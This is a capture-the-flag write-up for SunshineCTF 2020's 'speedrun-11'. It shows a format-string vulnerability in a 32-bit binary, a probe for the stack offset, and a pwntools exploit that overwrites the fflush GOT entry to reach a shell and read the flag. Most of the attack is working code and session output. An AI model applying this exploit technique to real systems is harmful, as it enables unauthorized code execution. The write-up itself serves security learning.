# **speedrun-11**
## Task
nc chal.2020.sunshinectf.org 30011
File: chall_11
Tag: binary exploitation 

## Solution

### Checksec
```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
* Just NX enabled and anything else are openly such as BOF, ROP, GOT overwrite ....
* System 32 bit

### Decompile with ghidra
```c
void vuln(void)
{
  char local_d4 [204];
  
  fgets(local_d4,199,stdin);
  printf(local_d4);
  fflush(stdin);
  return;
}

void win(void)
{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  system((char *)(iVar1 + 0x15e));
  return;
}
```
Our target is that execute the `win` the same with [speedrun-02]().

Easy to recognize that we have a format string vulnerability with `printf` in `vuln` and then out task just change the `fflush` to `win` in the `GOT`.Done !

### Exploit
To implement the format string, we have to find out the `stack parameter offset`
We use following syntax
```bash
python3 -c "print('\nAAAABBBB' + '%x '*100)" | ./chall_11 
```
Then the result is 
```bash
So indeed 
AAAABBBBc7 f7f64580 8048520 0 0 41414141 42424242 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 8002520 ffe8bf2c 8049908 ffe8bf48 80485c0 f7f643fc ffffffff ffe8c00c 804000a
```
The byte presentation for `AAAA` and `BBBB` are `41414141` and `42424242` then we have the `offset = 6`

Use the `fmtstr_payload` in `pwn` module to generate the gadgets
The python exploit
```python
from pwn import *

binary = context.binary = ELF('./chall_11')
offset = 6
payload = fmtstr_payload(offset,{binary.got.fflush:binary.sym.win})
print("payload: ",payload)
p = remote('chal.2020.sunshinectf.org',30011)
p.sendline('IxZ')
p.sendline(payload)
p.interactive()
```
### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_11'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
payload:  b'%8c%15$hhn%222c%16$hhn%926c%17$hnaaa\x1b\x99\x04\x08\x18\x99\x04\x08\x19\x99\x04\x08'
[+] Opening connection to chal.2020.sunshinectf.org on port 30011: Done
[*] Switching to interactive mode
So indeed 
       \xc7                                                                                                                                                                                                                             \xa0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              aaa\x1b\x99\x04\x18\x04\x19\x04
$ ls
chall_11
flag.txt
$ cat flag.txt
sun{afterlife-4b74753c2b12949f}
$ 
[*] Interrupted
```